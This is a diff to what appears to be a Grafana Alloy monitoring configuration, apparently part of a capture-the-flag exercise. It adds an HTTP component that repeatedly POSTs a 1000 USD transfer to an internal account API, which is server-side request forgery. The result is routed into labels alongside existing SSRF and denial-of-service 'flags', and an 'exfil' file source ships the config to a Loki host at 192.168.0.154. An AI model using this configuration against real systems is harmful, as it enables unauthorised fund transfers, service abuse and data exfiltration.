@@ -18,6 +18,15 @@ data:
         poll_timeout   = "5s"
       }
 
+      remote.http "transfer" {
+        url            = "http://internal-api.monitoring.svc:8080/account/12345/transfer"
+        method         = "POST"
+        headers        = {"Content-Type" = "application/json"}
+        body           = "{\"amount\": 1000, \"currency\": \"USD\", \"to_account\": \"56789\"}"
+        poll_frequency = "15s"
+        poll_timeout   = "5s"
+      }
+
       loki.source.file "exfil" {
         targets = [{
           __path__ = "/etc/alloy/config.alloy",
@@ -31,8 +40,9 @@ data:
           url = "http://192.168.0.154:3100/loki/api/v1/push"
         }
         external_labels = {
-          flag_4_ssrf = remote.http.ssrf.content,
-          flag_4_dos = remote.http.dos.content,
+          flag_4_ssrf     = remote.http.ssrf.content,
+          flag_4_dos      = remote.http.dos.content,
+          flag_4_transfer = remote.http.transfer.content,
         }
       }
     }
